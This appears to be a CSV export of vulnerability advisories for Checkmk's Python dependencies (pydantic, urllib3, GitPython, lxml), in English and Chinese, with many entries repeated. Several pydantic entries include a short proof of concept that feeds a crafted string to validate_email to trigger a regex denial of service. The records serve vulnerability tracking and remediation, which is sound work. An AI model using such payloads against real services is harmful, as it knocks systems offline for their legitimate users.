- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7360/commits/64cd8266602f5ffa898f938681be3626df345384)
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7673/commits/3cc150ecbf86ac3509e1ca2904bf2c256c3fb558)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7673)
",3,2
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-09-20,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the `networks.py` file.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631)
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
",3,2
Checkmk_checkmk,pydantic,,True,CVE-2024-3772,CWE-1333,2024-04-15,"Pydantic是Pydantic开源的一个库。可以使用 Python 类型提示进行数据验证。
Pydantic 2.4.0之前、1.10.13之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过精心设计的电子邮件字符串造成拒绝服务。",3,0
Checkmk_checkmk,urllib3,,True,,CWE-453,2020-12-02,"## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Insecure Defaults. The default SSL/TLS settings were insecure.
## Remediation
Upgrade `urllib3` to version 1.8 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/2088570a293df42b1623dd74fcff0174d0565af5)
",3,2
Checkmk_checkmk,urllib3,,True,CVE-2020-26137,CWE-74,2020-09-29,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.25.9之前版本存在注入漏洞。该漏洞源于可以在putrequest()的第一个参数中插入CR和LF控制字符。</p>,3,2
Checkmk_checkmk,urllib3,,True,CVE-2019-11324,CWE-295,2019-04-18,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本中存在信任管理问题漏洞。该漏洞源于网络系统或产品中缺乏有效的信任管理机制。攻击者可利用默认密码或者硬编码密码、硬编码证书等攻击受影响组件。",2,2
Checkmk_checkmk,urllib3,,True,CVE-2019-11236,CWE-93,2019-04-15,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.24.1及之前版本版本中存在注入漏洞，该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。</p>,3,0
Checkmk_checkmk,urllib3,,True,CVE-2018-20060,CWE-288,2018-12-11,"urllib3是一个基于Python的HTTP库，它具有线程安全连接池和文件后期支持等功能。
urllib3 1.23之前版本中存在安全漏洞，该漏洞源于程序在进行跨源重定向时，没有移除Authorization HTTP报头，导致授权报头中的凭证暴露给其他主机或以明文的形式传输。攻击者可利用该漏洞获取敏感信息。",1,2
Checkmk_checkmk,urllib3,,True,CVE-2021-33503,CWE-400,2021-06-02,"<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 Urllib3 存在资源管理错误漏洞，该漏洞源于在鉴权模块的URL中添加@参数导致，攻击者可利用该漏洞引起资源冲突导致拒绝服务。以下产品及型号会受到影响：Urllib3 0.3, 0.3.1, 0.4, 0.4.1, 1.0, 1.0.1, 1.0.2, 1.1, 1.2, 1.2.1, 1.3, 1.4, 1.5, 1.6, 1.7, 1.7.1, 1.8, 1.8.1, 1.8.2, 1.8.3, 1.9, 1.9.1, 1.10, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.11, 1.12, 1.13, 1.13.1, 1.14, 1.15, 1.15.1, 1.16, 1.17, 1.18, 1.18.1, 1.19, 1.19.1, 1.20, 1.21, 1.21.1, 1.22, 1.23, 1.24, 1.24.1, 1.24.2, 1.24.3, 1.25, 1.25.1, 1.25.2, 1.25.3, 1.25.4, 1.25.5, 1.25.6, 1.25.7, 1.25.8, 1.25.9, 1.25.10, 1.25.11, 1.26.0, 1.26.1, 1.26.2, 1.26.3, 1.26.4。</p>",2,2
Checkmk_checkmk,urllib3,,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
Checkmk_checkmk,urllib3,,True,CVE-2018-25091,CWE-601,2023-10-15,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本存在安全漏洞，该漏洞源于允许攻击者获取授权标头中的凭据或以明文形式传输凭据。",3,0
Checkmk_checkmk,urllib3,,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
Checkmk_checkmk,urllib3,,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
Checkmk_checkmk,urllib3,,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
Checkmk_checkmk,pydantic,,True,CVE-2021-29510,CWE-835,2021-05-13,"pydantic是一个应用软件。使用Python类型提示进行数据验证和设置管理。
Pydantic 存在安全漏洞。该漏洞源于程序的验证将永远以100％的CPU使用率运行。",3,0
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-10-01,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `validate_email` function due to improper limitation of mail length and the usage of an insecure regular expression.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7360/commits/64cd8266602f5ffa898f938681be3626df345384)
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7673/commits/3cc150ecbf86ac3509e1ca2904bf2c256c3fb558)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7673)
",3,2
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-09-20,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the `networks.py` file.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631)
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
",3,2
Checkmk_checkmk,pydantic,,True,CVE-2024-3772,CWE-1333,2024-04-15,"Pydantic是Pydantic开源的一个库。可以使用 Python 类型提示进行数据验证。
Pydantic 2.4.0之前、1.10.13之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过精心设计的电子邮件字符串造成拒绝服务。",3,0
Checkmk_checkmk,GitPython,,True,,CWE-1333,2022-02-21,"## Overview
[GitPython](https://pypi.org/project/GitPython/) is a python library used to interact with Git repositories

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when a user controls the input passed to the pattern matching function.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `GitPython` to version 3.1.27 or higher.
## References
- [GitHub Commit](https://github.com/gitpython-developers/GitPython/commit/75f4f63ab3856a552f06082aabf98845b5fa21e3)
",3,0
Checkmk_checkmk,GitPython,,True,CVE-2024-22190,CWE-426,2024-01-10,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.40及之前版本存在代码问题漏洞，该漏洞源于允许攻击者通过不受信任的搜索路径执行任意代码。",2,0
Checkmk_checkmk,GitPython,,True,CVE-2023-40267,CWE-94,2023-08-11,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32之前版本存在安全漏洞，该漏洞源于没有阻止clone和clone_from中不安全的non-multi选项。",1,2
Checkmk_checkmk,GitPython,,True,CVE-2023-40590,CWE-426,2023-08-28,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在代码问题漏洞，该漏洞源于攻击者可以诱骗用户下载带有恶意git可执行文件的存储库，攻击者可以运行任何任意命令。",2,0
Checkmk_checkmk,GitPython,,True,CVE-2023-41040,CWE-22,2023-08-30,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在路径遍历漏洞，该漏洞源于为了解析一些 git 引用，GitPython 从目录中读取文件.git，在某些情况，GitPython 不会检查该文件是否位于目录之外.git，导致攻击者可以让 GitPython 从系统中读取任何文件。",3,0
Checkmk_checkmk,GitPython,,True,CVE-2022-24439,CWE-20,2022-12-06,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython存在安全漏洞，该漏洞源于不正确的用户输入验证，攻击者利用该漏洞可以远程代码执行。",1,1
Checkmk_checkmk,lxml,,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
Checkmk_checkmk,lxml,,True,CVE-2014-3146,CWE-79,2014-04-15,"lxml是一个使用Python语言编写的用于处理XML和HTML的库。
lxml 3.3.4及之前版本的lxml.html.clean模块中存在不完整黑名单漏洞，该漏洞源于程序没有正确过滤link scheme中的控制字符。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,1
Checkmk_checkmk,lxml,,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
Checkmk_checkmk,lxml,,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
Checkmk_checkmk,lxml,,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
Checkmk_checkmk,lxml,,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
Checkmk_checkmk,lxml,,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
Checkmk_checkmk,lxml,,True,,CWE-400,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to race conditions when errors or user messages occur during threaded XSLT processing.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `lxml` to version 2.3.4 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/26ae51c60462ba1567a123bc9701ff18f9c10789)
",4,0
Checkmk_checkmk,pydantic,,True,CVE-2021-29510,CWE-835,2021-05-13,"pydantic是一个应用软件。使用Python类型提示进行数据验证和设置管理。
Pydantic 存在安全漏洞。该漏洞源于程序的验证将永远以100％的CPU使用率运行。",3,0
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-10-01,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `validate_email` function due to improper limitation of mail length and the usage of an insecure regular expression.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

